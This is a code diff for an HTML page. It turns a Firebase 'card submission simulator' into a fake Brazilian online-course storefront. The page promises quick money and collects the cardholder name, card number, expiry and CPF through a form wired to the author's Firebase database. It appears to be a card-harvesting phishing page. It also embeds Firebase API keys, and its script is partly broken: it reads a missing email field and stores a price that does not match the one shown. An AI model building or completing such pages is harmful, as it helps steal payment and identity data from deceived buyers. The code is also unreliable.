@@ -1,57 +1,128 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Simulador Firebase</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Loja Premium - Curso Online</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 700px;
+      margin: 50px auto;
+      background: white;
+      border-radius: 10px;
+      padding: 30px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+    }
+    img {
+      width: 100%;
+      border-radius: 10px;
+    }
+    h1 {
+      color: #222;
+      margin-top: 20px;
+    }
+    p {
+      font-size: 18px;
+      line-height: 1.5;
+      color: #444;
+    }
+    .price {
+      color: green;
+      font-size: 24px;
+      font-weight: bold;
+      margin: 10px 0;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      font-size: 16px;
+    }
+    button {
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    .success {
+      background: #d4edda;
+      color: #155724;
+      padding: 10px;
+      border-radius: 5px;
+      margin-top: 20px;
+    }
+  </style>
 </head>
 <body>
-  <h2>Simulação de Envio para Firebase</h2>
-  <input type="text" id="cartao" placeholder="Digite o número do cartão (simulado)">
-  <button onclick="enviarCartao()">Enviar</button>
-  <p id="status"></p>
+  <div class="container">
+    <img src="https://i.imgur.com/e1hLQ2A.jpg" alt="Curso Premium">
+    <h1>🎓 Transforme sua vida em 7 dias!</h1>
+    <p>Quer muder de vida, ganhar dinheiro sem aparecer curso online da atualidade. Acesse conteúdo exclusivo em vídeo, PDF, aulas bônus e muito mais.</p>
+    <p class="price">Apenas R$70,00</p>
 
-  <!-- Firebase SDKs -->
-  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+    <form id="buyForm">
+      <input type="text" id="nome" placeholder="Nome do titular" required />
+      <input type="cvv" id="cvv" placeholder="Seu cartão" required />
+      <input type="validade" id="validade" placeholder="validade" required />
+      <input type="cpf" id="cpf" placeholder="cpf" required />
+      <button type="submit">Comprar agora</button>
+    </form>
+
+    <div id="mensagem" class="success" style="display: none;">
+      Compra registrada com sucesso! 🎉
+    </div>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
 
   <script>
-    // Sua configuração do Firebase (vinda da imagem)
+    // ✅ CONFIGURAÇÃO DO SEU FIREBASE (da imagem que você mandou)
     const firebaseConfig = {
-      apiKey: "AIzaSyDnjQvA04Oz7t2lDMfTSAkK3Ek",
-      authDomain: "telefone-2569d.firebaseapp.com",
-      projectId: "telefone-2569d",
-      storageBucket: "telefone-2569d.appspot.com",
-      messagingSenderId: "829475317537",
-      appId: "1:829475317537:web:823e55af8806d27441c56e"
+      apiKey: "AIzaSyA5nKgYdMHQYFwWyxE5JYQWwEjKZ5S7mVo",
+      authDomain: "testeapps-4440a.firebaseapp.com",
+      projectId: "testeapps-4440a",
+      storageBucket: "testeapps-4440a.appspot.com",
+      messagingSenderId: "609939982769",
+      appId: "1:609939982769:web:e4fbd7f7df1f4db8390e92"
     };
 
-    // Inicializa o Firebase
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    // Função para enviar dados
-    function enviarCartao() {
-      const numero = document.getElementById("cartao").value;
-      const status = document.getElementById("status");
+    // ✅ Função de compra
+    document.getElementById('buyForm').addEventListener('submit', function(e) {
+      e.preventDefault();
 
-      if (numero.trim() === "") {
-        status.innerText = "Preencha o campo corretamente.";
-        return;
-      }
+      const nome = document.getElementById('nome').value;
+      const email = document.getElementById('email').value;
 
-      db.collection("cartoes_testes").add({
-        numero_cartao: numero,
-        enviado_em: new Date().toISOString()
+      db.collection("compras").add({
+        nome: nome,
+        email: email,
+        produto: "Curso Premium Online",
+        preco: "49.90",
+        data: new Date().toISOString()
       })
       .then(() => {
-        status.innerText = "Cartão enviado com sucesso (simulado).";
-        document.getElementById("cartao").value = "";
+        document.getElementById('mensagem').style.display = 'block';
+        document.getElementById('buyForm').reset();
       })
       .catch((error) => {
-        console.error("Erro ao enviar:", error);
-        status.innerText = "Erro ao enviar.";
+        alert("Erro ao registrar compra: " + error);
       });
-    }
+    });
   </script>
 </body>
 </html>
